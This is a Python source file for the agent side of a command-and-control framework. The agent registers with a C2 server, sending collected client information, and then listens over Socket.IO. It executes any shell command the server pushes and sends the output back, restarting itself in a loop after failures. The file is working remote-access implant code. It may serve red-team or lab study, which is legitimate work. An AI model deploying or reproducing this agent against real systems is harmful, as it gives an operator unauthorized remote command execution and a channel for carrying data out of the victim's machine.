# agent/agent.py

"""
Agent Main Module

This module defines the Agent class and its interactions with the C2 API and Socket.IO server.
The agent performs the following actions:
1. Registers with the C2 server via REST API.
2. Connects to a Socket.IO server for command communication.
3. Listens and executes commands sent by the C2 server.
"""

import logging
import os
import sys
from time import sleep

import requests
import socketio

# Add the parent directory of the `agent` package to the Python path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from agent.helper import get_agent_id, get_client_info, run_command

# Configuration for logging
LOG_LEVEL = os.getenv("LOG_LEVEL", "INFO").upper()

# Enhanced logging setup
logging.basicConfig(
    level=getattr(logging, LOG_LEVEL, logging.INFO),  # Fetch log level from environment or use INFO
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.StreamHandler()],
)


class Agent:
    """
    Represents a client that interacts with a Command and Control (C2) server using REST and Socket.IO.

    Attributes:
        c2_url (str): URL of the C2 server REST API.
        socket_url (str): URL of the Socket.IO server.
        sio (socketio.Client): Socket.IO client instance.
        is_registered (bool): Indicates whether the agent is registered with the C2 API.
        agent_id (str): Unique identifier for the agent.
    """

    def __init__(self, c2_host, c2_port, socket_host, socket_port):
        """
        Initialize the Agent instance with C2 and Socket.IO server details.

        Args:
            c2_host (str): Hostname or IP address of the C2 server.
            c2_port (int): Port number of the C2 server.
            socket_host (str): Hostname or IP address of the Socket.IO server.
            socket_port (int): Port number of the Socket.IO server.
        """
        self.c2_url = self.format_url(c2_host, c2_port)
        self.socket_url = self.format_url(socket_host, socket_port)
        self.sio = socketio.Client(reconnection=True, reconnection_attempts=5)
        self.is_registered = False
        self.agent_id = None

        # Register Socket.IO event handlers
        self.sio.on("connect", self.on_connect)
        self.sio.on("disconnect", self.on_disconnect)
        self.sio.on("execute_command", self.on_execute_command)

        logging.info(
            "Agent initialized with C2 URL: %s and Socket URL: %s",
            self.c2_url,
            self.socket_url,
        )
        logging.debug(
            "Initialization details - C2 URL: %s, Socket URL: %s",
            self.c2_url,
            self.socket_url,
        )

    @staticmethod
    def format_url(host, port):
        """
        Ensure the URL has the correct schema (http/https) and append the port.

        Args:
            host (str): Hostname or IP address.
            port (int): Port number.

        Returns:
            str: Formatted URL with schema and port.
        """
        if not host.startswith("http://") and not host.startswith("https://"):
            host = f"http://{host}"
        logging.debug("Formatted URL: %s:%s", host, port)
        return f"{host}:{port}"

    def on_connect(self):
        """
        Handle successful connection to the Socket.IO server.
        """
        logging.info("Connected to Socket.IO server at %s", self.socket_url)
        if self.agent_id:
            logging.debug(
                "Agent ID already set: %s. Registering Socket.IO client.", self.agent_id
            )
            self.register_socket_client()

    def on_disconnect(self):
        """
        Handle disconnection from the Socket.IO server.
        """
        logging.warning("Disconnected from the Socket.IO server")

    def on_execute_command(self, data: dict):
        """
        Handle the execution of a command sent by the C2 server.

        Args:
            data (dict): Contains `agent_id`, `task_id`, and `command`.
        """
        logging.info("Received 'execute_command' event with data: %s", data)
        logging.debug("Command event details: %s", data)

        command = data.get("command")
        if not command:
            logging.error("No command received in the event data")
            return

        command_output = run_command(command)
        logging.debug("Command executed. Output: %s", command_output)

        response = {
            "agent_id": data.get("agent_id"),
            "command": command,
            "command_output": command_output,
        }
        self._send_response(response)

    def _send_response(self, response: dict):
        """
        Sends a response back to the server.

        Args:
            response (dict): The response data to send.
        """
        try:
            self.sio.emit("command_response", response)
            logging.info("Response sent for command: %s", response.get("command"))
            logging.debug("Response data: %s", response)
        except Exception as e:
            logging.error(
                "Failed to send response for command: %s - Error: %s",
                response.get("command"),
                e,
            )

    def connect_to_socket(self):
        """
        Connect to the Socket.IO server.
        """
        try:
            logging.info("Connecting to Socket.IO server at %s", self.socket_url)
            self.sio.connect(self.socket_url, transports=["websocket"])
            logging.debug(
                "Socket.IO connection initiated with URL: %s", self.socket_url
            )
        except Exception as e:
            logging.critical("Failed to connect to Socket.IO server: %s", e)
            sys.exit(1)

    def register_api_client(self):
        """
        Registers the agent with the C2 API server.
        """
        if self.is_registered:
            logging.info("Agent is already registered with the C2 API.")
            return

        client_info = get_client_info()
        self.agent_id, error = get_agent_id()

        if error or not self.agent_id:
            logging.critical("Failed to fetch Agent ID: %s", error)
            sys.exit(1)

        client_data = {"agent_id": self.agent_id, "client_info": client_info}
        logging.info("Registering client with C2 API: %s", client_data)
        logging.debug("Client registration payload: %s", client_data)

        try:
            response = requests.post(
                f"{self.c2_url}/register", json=client_data, timeout=5
            )
            response.raise_for_status()
            self.is_registered = True
            logging.info("Client registered successfully with C2 API.")
        except requests.exceptions.RequestException as e:
            logging.critical("Failed to register client with C2 API: %s", e)
            sys.exit(1)

    def register_socket_client(self):
        """
        Registers the agent with the Socket.IO server.
        """
        if not self.agent_id:
            logging.error(
                "Agent ID is not set. Unable to register with Socket.IO server."
            )
            return

        client_data = {"agent_id": self.agent_id}
        try:
            self.sio.emit("register_client", client_data)
            logging.info("Client registration request sent to Socket.IO server.")
            logging.debug("Client registration data: %s", client_data)
        except Exception as e:
            logging.error("Failed to register with Socket.IO server: %s", e)

    def listen(self):
        """
        Listens for incoming commands from the Socket.IO server.
        """
        logging.info("Starting Socket.IO client to listen for commands.")
        logging.debug("Calling connect_to_socket method to establish connection.")
        self.connect_to_socket()
        self.sio.wait()


if __name__ == "__main__":
    main_c2_host = os.getenv("C2_SERVER_HOST", "0.0.0.0")
    main_c2_port = int(os.getenv("C2_SERVER_PORT", "6001"))
    main_socket_host = os.getenv("SOCKET_HOST", "0.0.0.0")
    main_socket_port = int(os.getenv("SOCKET_PORT", "6003"))

    while True:
        try:
            agent = Agent(
                main_c2_host, main_c2_port, main_socket_host, main_socket_port
            )
            agent.register_api_client()
            agent.listen()
        except Exception as e:
            logging.error("An error occurred: %s", e)
            logging.debug("Exception details: %s", e, exc_info=True)
            logging.info("Restarting agent in 5 seconds...")
            sleep(5)
